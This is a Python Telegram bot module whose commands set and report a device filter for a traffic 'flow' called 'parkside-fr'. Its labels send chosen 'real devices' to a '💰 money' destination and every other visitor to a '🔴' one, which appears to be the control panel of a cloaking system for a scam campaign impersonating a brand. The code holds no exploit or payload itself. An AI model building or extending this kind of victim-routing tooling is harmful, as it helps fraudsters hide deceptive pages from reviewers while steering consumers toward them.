"""
/setdevice   parkside-fr <filter>
/deviceinfo  parkside-fr
"""
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from core.domain_manager import require_flow, set_device_filter

VALID_FILTERS = ("all", "mobile", "desktop", "android", "ios", "windows", "macos")

_DESCRIPTIONS = {
    "all":     "All real devices → 💰 money",
    "mobile":  "📱 Mobile & tablet (Android + iOS) → 💰  |  🖥 Desktop → 🔴",
    "desktop": "🖥 Desktop (Win + Mac) → 💰  |  📱 Mobile → 🔴",
    "android": "🤖 Android only → 💰  |  others → 🔴",
    "ios":     "🍎 iOS only → 💰  |  others → 🔴",
    "windows": "🪟 Windows only → 💰  |  others → 🔴",
    "macos":   "🍏 macOS only → 💰  |  others → 🔴",
}


async def cmd_setdevice(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) < 2:
        filters = " | ".join(f"`{f}`" for f in VALID_FILTERS)
        await update.message.reply_text(
            f"Usage: `/setdevice parkside-fr <filter>`\n\n*Filters:* {filters}",
            parse_mode="Markdown",
        )
        return
    flow_name     = ctx.args[0].lower()
    device_filter = ctx.args[1].lower()
    if device_filter not in VALID_FILTERS:
        await update.message.reply_text(
            f"❌ Invalid filter `{device_filter}`.\nChoose: {' | '.join(VALID_FILTERS)}",
            parse_mode="Markdown",
        )
        return
    try:
        require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    set_device_filter(flow_name, device_filter)
    await update.message.reply_text(
        f"✅ Device filter for flow `{flow_name}` → `{device_filter}`\n{_DESCRIPTIONS[device_filter]}",
        parse_mode="Markdown",
    )


async def cmd_deviceinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/deviceinfo parkside-fr`", parse_mode="Markdown")
        return
    flow_name = ctx.args[0].lower()
    try:
        row = require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    current = row["device_filter"] or "all"
    lines   = "\n".join(
        f"{'✅' if f == current else '⬜'} `{f}` — {_DESCRIPTIONS[f]}"
        for f in VALID_FILTERS
    )
    await update.message.reply_text(
        f"*Device filter · `{flow_name}`*\n\nCurrent: `{current}`\n\n{lines}",
        parse_mode="Markdown",
    )


def register(app):
    app.add_handler(CommandHandler("setdevice",  cmd_setdevice))
    app.add_handler(CommandHandler("deviceinfo", cmd_deviceinfo))
